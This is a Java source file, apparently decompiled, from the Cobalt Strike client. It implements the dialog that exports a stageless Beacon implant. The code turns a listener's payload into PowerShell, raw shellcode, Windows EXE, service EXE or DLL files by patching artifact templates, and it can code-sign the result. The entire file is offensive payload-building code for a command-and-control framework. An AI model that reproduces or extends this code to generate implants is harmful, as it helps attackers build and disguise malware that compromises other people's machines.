package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import common.ArtifactUtils;
import common.CommonUtils;
import common.ListenerUtils;
import common.ResourceUtils;
import common.ScListener;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;

import java.awt.event.ActionEvent;
import java.io.File;
import java.io.IOException;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class WindowsExecutableStageDialog implements DialogListener, SafeDialogCallback {

    protected JFrame dialog = null;

    protected ActionEvent event = null;

    protected Map options = null;

    protected String outfile = "";

    protected AggressorClient client = null;

    public WindowsExecutableStageDialog(AggressorClient aggressorClient) {
        this.client = aggressorClient;
    }

    public void dialogAction(ActionEvent actionEvent, Map map) {
        this.event = actionEvent;
        this.options = map;
        String str1 = map.get("output") + "";
        String str2 = "";
        if (str1.indexOf("PowerShell") > -1) {
            str2 = "beacon.ps1";
        } else if (str1.indexOf("Raw") > -1) {
            str2 = "beacon.bin";
        } else if (str1.indexOf("EXE") > -1) {
            str2 = "beacon.exe";
        } else if (str1.indexOf("DLL") > -1) {
            str2 = "beacon.dll";
        }
        SafeDialogs.saveFile(null, str2, this);
    }

    public void dialogResult(String string) {
        this.outfile = string;
        String str1 = DialogUtils.string(this.options, "stage");
        String str2 = DialogUtils.bool(this.options, "x64") ? "x64" : "x86";
        ScListener scListener = ListenerUtils.getListener(this.client, str1);
        byte[] arrby = scListener.export(str2);
        if (arrby.length == 0) {
            DialogUtils.showError("Could not generate " + str2 + " payload for " + str1);
            return;
        }
        String str3 = this.options.get("output") + "";
        boolean bool1 = DialogUtils.bool(this.options, "x64");
        boolean bool2 = DialogUtils.bool(this.options, "sign");
        if (bool1) {
            if (str3.equals("Windows EXE")) {
                (new ArtifactUtils(this.client)).patchArtifact(arrby, "artifact64big.exe", this.outfile);
            } else if (str3.equals("Windows Service EXE")) {
                (new ArtifactUtils(this.client)).patchArtifact(arrby, "artifact64svcbig.exe", this.outfile);
            } else {
                if (str3.equals("Windows DLL (32-bit)")) {
                    DialogUtils.showError("I can't generate an x86 artifact for an x64 payload.");
                    return;
                }
                if (str3.equals("Windows DLL (64-bit)")) {
                    (new ArtifactUtils(this.client)).patchArtifact(arrby, "artifact64big.x64.dll", this.outfile);
                } else if (str3.equals("PowerShell")) {
                    (new ResourceUtils(this.client)).buildPowerShell(arrby, this.outfile, true);
                } else {
                    CommonUtils.writeToFile(new File(this.outfile), arrby);
                }
            }
        } else if (str3.equals("Windows EXE")) {
            (new ArtifactUtils(this.client)).patchArtifact(arrby, "artifact32big.exe", this.outfile);
        } else if (str3.equals("Windows Service EXE")) {
            (new ArtifactUtils(this.client)).patchArtifact(arrby, "artifact32svcbig.exe", this.outfile);
        } else if (str3.equals("Windows DLL (32-bit)")) {
            (new ArtifactUtils(this.client)).patchArtifact(arrby, "artifact32big.dll", this.outfile);
        } else if (str3.equals("Windows DLL (64-bit)")) {
            (new ArtifactUtils(this.client)).patchArtifact(arrby, "artifact64big.dll", this.outfile);
        } else if (str3.equals("PowerShell")) {
            (new ResourceUtils(this.client)).buildPowerShell(arrby, this.outfile);
        } else {
            CommonUtils.writeToFile(new File(this.outfile), arrby);
        }
        if (bool2)
            if (this.outfile.toLowerCase().endsWith(".exe") || this.outfile.toLowerCase().endsWith(".dll")) {
                DataUtils.getSigner(this.client.getData()).sign(new File(this.outfile));
            } else {
                DialogUtils.showError("Can only sign EXE and DLL files");
                return;
            }
        DialogUtils.showInfo("Saved " + str3 + " to\n" + this.outfile);
    }

    public void show() throws IOException {
        this.dialog = DialogUtils.dialog("Windows Executable (Stageless)", 640, 480);
        DialogManager dialogManager = new DialogManager(this.dialog);
        dialogManager.addDialogListener(this);
        dialogManager.set("output", "Windows EXE");
        dialogManager.sc_listener_all("stage", "Listener:", this.client);
        dialogManager.combobox("output", "Output:", CommonUtils.toArray("PowerShell, Raw, Windows EXE, Windows Service EXE, Windows DLL (32-bit), Windows DLL (64-bit)"));
        dialogManager.checkbox_add("x64", "x64:", "Use x64 payload");
        dialogManager.checkbox_add("sign", "sign:", "Sign executable file", DataUtils.getSigner(this.client.getData()).available());
        JButton jButton1 = dialogManager.action("Generate");
        JButton jButton2 = dialogManager.help("https://www.cobaltstrike.com/help-staged-exe");
        this.dialog.add(DialogUtils.description("Export a stageless Beacon as a Windows executable. Use Cobalt Strike Arsenal scripts (Help -> Arsenal) to customize this process."), "North");
        this.dialog.add(dialogManager.layout(), "Center");
        this.dialog.add(DialogUtils.center(jButton1, jButton2), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }

}
